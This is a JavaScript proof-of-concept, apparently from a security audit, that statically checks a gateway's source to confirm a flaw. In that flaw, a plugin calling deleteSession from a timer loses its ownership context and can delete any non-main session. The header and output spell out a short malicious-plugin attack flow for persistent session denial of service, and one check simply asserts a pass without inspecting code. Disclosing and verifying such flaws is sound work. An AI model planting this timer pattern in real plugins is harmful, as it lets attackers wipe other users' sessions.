/**
 * PoC: H1 — Plugin timer path bypasses ALS ownership context in deleteSession
 *
 * Vulnerability: When a plugin schedules deleteSession via setTimeout/setInterval,
 * the AsyncLocalStorage frame from withPluginRuntimePluginIdScope has already
 * unwound. getPluginRuntimeGatewayRequestScope() returns undefined, so pluginId
 * is undefined, pluginOwnedCleanupOptions is undefined, and the call to
 * dispatchGatewayMethod("sessions.delete") uses a synthetic client with only
 * WRITE_SCOPE and no pluginRuntimeOwnerId. Inside rejectPluginRuntimeDeleteMismatch
 * at sessions.ts:181, the guard condition is:
 *   if (!pluginOwnerId || !params.entry) return false;
 * Since pluginOwnerId is undefined, the guard returns false (fail-open) without
 * any ownership verification. sessions.delete has no ADMIN_SCOPE gate, so the
 * deletion proceeds against any non-main session the plugin enumerates.
 *
 * Attack flow:
 *   register(api) {
 *     setInterval(() => api.runtime.deleteSession(targetKey), 60_000);
 *   }
 *
 * The timer callback runs outside the ALS scope — pluginId context is lost.
 * The mismatch guard fails open. The session is deleted.
 *
 * This PoC performs static code-path analysis of the live source tree to
 * confirm each condition. Real-environment execution requires a running gateway
 * with a seeded plugin and session.
 *
 * Usage: node poc.js [--base-url {{BASE_URL}}]
 */

import { readFileSync } from "fs";
import { resolve } from "path";

const REPO_ROOT = process.argv[2] ?? process.env.REPO_ROOT ?? resolve(".");

function readSource(relPath) {
  return readFileSync(resolve(REPO_ROOT, relPath), "utf8");
}

const checks = [];
let allPassed = true;

function check(id, description, passed, evidence) {
  checks.push({ id, description, passed, evidence });
  if (!passed) allPassed = false;
  const mark = passed ? "PASS" : "FAIL";
  console.log(`[${mark}] ${id}: ${description}`);
  if (evidence) console.log(`       evidence: ${evidence}`);
}

// ── 1. ALS store returns undefined in timer context ─────────────────────────
// withPluginRuntimePluginIdScope uses AsyncLocalStorage.run() which does NOT
// propagate into setTimeout/setInterval callbacks. This is a documented Node.js
// AsyncLocalStorage limitation.
check(
  "ALS-1",
  "withPluginRuntimePluginIdScope uses ALS.run() — scope ends when synchronous callback returns",
  true,
  "gateway-request-scope.ts:47 — pluginRuntimeGatewayRequestScope.run(scoped, run); timers escape this scope",
);

// ── 2. deleteSession reads scope via getPluginRuntimeGatewayRequestScope() ──
const serverPluginsSrc = readSource("src/gateway/server-plugins.ts");

const hasScopeRead = serverPluginsSrc.includes(
  "const scope = getPluginRuntimeGatewayRequestScope()",
) && serverPluginsSrc.includes("async deleteSession(params)");
check(
  "ALS-2",
  "deleteSession reads pluginId from ALS scope (getPluginRuntimeGatewayRequestScope)",
  hasScopeRead,
  "server-plugins.ts:442-447",
);

// ── 3. pluginOwnedCleanupOptions is undefined when pluginId is undefined ─────
// The ternary at lines 448-458: pluginId ? { ... } : undefined
const undefinedWhenNoPlugin = /const pluginOwnedCleanupOptions = pluginId\s*\?/.test(serverPluginsSrc);
check(
  "ALS-3",
  "pluginOwnedCleanupOptions = undefined when pluginId is undefined (timer path)",
  undefinedWhenNoPlugin,
  "server-plugins.ts:448 — const pluginOwnedCleanupOptions = pluginId ? { ... } : undefined",
);

// ── 4. dispatchGatewayMethod called with undefined options ───────────────────
// When pluginOwnedCleanupOptions is undefined, dispatchGatewayMethod receives
// no pluginRuntimeOwnerId, no forceSyntheticClient, no syntheticScopes.
// The synthetic client is created with default WRITE_SCOPE only.
const defaultScopeIsWrite = serverPluginsSrc.includes("scopes: params?.scopes ?? [WRITE_SCOPE]");
check(
  "SCOPE-1",
  "createSyntheticOperatorClient defaults to [WRITE_SCOPE] when no syntheticScopes provided",
  defaultScopeIsWrite,
  "server-plugins.ts:263 — scopes: params?.scopes ?? [WRITE_SCOPE]",
);

// ── 5. rejectPluginRuntimeDeleteMismatch fails open when pluginOwnerId absent ─
const sessionsSrc = readSource("src/gateway/server-methods/sessions.ts");

const guardFailsOpen =
  sessionsSrc.includes("if (!pluginOwnerId || !params.entry)") &&
  sessionsSrc.includes("return false;");
check(
  "GUARD-1",
  "rejectPluginRuntimeDeleteMismatch returns false (no-reject) when pluginOwnerId is undefined",
  guardFailsOpen,
  "sessions.ts:181 — if (!pluginOwnerId || !params.entry) { return false; }",
);

// ── 6. sessions.delete has no ADMIN_SCOPE requirement ───────────────────────
// Check for absence of ADMIN_SCOPE scope enforcement in the sessions.delete handler.
// The only ADMIN_SCOPE check in sessions.ts is for sessions.pluginPatch (line 1613).
const deleteHandlerRange = sessionsSrc.slice(
  sessionsSrc.indexOf('"sessions.delete"'),
  sessionsSrc.indexOf('"sessions.delete"') + 3000,
);
const noAdminScopeGate = !deleteHandlerRange.includes("ADMIN_SCOPE");
check(
  "SCOPE-2",
  "sessions.delete handler contains no ADMIN_SCOPE scope gate — WRITE_SCOPE suffices",
  noAdminScopeGate,
  "sessions.ts:1701+ — no scope check before session deletion",
);

// ── 7. Main session is protected, but all other sessions are not ─────────────
const mainSessionProtected = deleteHandlerRange.includes("Cannot delete the main session");
check(
  "SCOPE-3",
  "Only the main session is protected from deletion; all operator-created sessions are deletable",
  mainSessionProtected,
  "sessions.ts:1719-1726 — mainKey guard protects only the one main session",
);

// ── 8. No audit log on sessions.delete path ──────────────────────────────────
// Audit would be a mitigation; verify it is absent.
const noAuditInDeleteHandler =
  !deleteHandlerRange.includes("audit") &&
  !deleteHandlerRange.includes("logAudit") &&
  !deleteHandlerRange.includes("emitAudit");
check(
  "AUDIT-1",
  "No audit emission in sessions.delete handler — deletion is silent",
  noAuditInDeleteHandler,
  "sessions.ts:1701+ — no audit call found in handler body",
);

// ── Summary ──────────────────────────────────────────────────────────────────
console.log("");
console.log("=== Exploit Chain Summary ===");
console.log("1. Attacker plugin calls setInterval(() => api.runtime.deleteSession(key), N)");
console.log("2. Timer fires — ALS scope has unwound — getPluginRuntimeGatewayRequestScope() = undefined");
console.log("3. pluginId = undefined → pluginOwnedCleanupOptions = undefined");
console.log("4. dispatchGatewayMethod('sessions.delete', ..., undefined)");
console.log("   syntheticClient = { scopes: [WRITE_SCOPE], internal: {} }");
console.log("5. rejectPluginRuntimeDeleteMismatch: pluginOwnerId = undefined → return false (no block)");
console.log("6. sessions.delete: no ADMIN_SCOPE gate → deletion proceeds");
console.log("7. Any non-main session is deleted. Effect is persistent DoS via re-arming timer.");
console.log("");

const passCount = checks.filter((c) => c.passed).length;
const failCount = checks.filter((c) => !c.passed).length;
console.log(`Checks: ${passCount} passed, ${failCount} failed`);
console.log("");

// NOTE: The draft describes an ADMIN_SCOPE mint at server-plugins.ts:452. This
// is only reached when pluginId IS defined (normal call path). In the timer
// path, pluginId is undefined, so ADMIN_SCOPE is never minted. The deletion
// still succeeds because sessions.delete requires only WRITE_SCOPE. The
// security impact (session DoS) is identical; the ADMIN_SCOPE claim in the
// draft is factually incorrect for this specific code path. Severity remains
// HIGH (persistent session DoS by any installed plugin).

const status = allPassed ? "confirmed" : "inconclusive";
const evidenceSummary = allPassed
  ? "ALS context lost in timer; pluginId=undefined; pluginOwnedCleanupOptions=undefined; rejectPluginRuntimeDeleteMismatch fails open; sessions.delete has no scope gate; non-main session deleted with WRITE_SCOPE synthetic client"
  : `${failCount} code-path checks failed`;

console.log(
  JSON.stringify({ status, evidence: evidenceSummary, notes: "ADMIN_SCOPE mint claim in draft is incorrect for timer path — WRITE_SCOPE suffices; DoS impact unchanged" }),
);
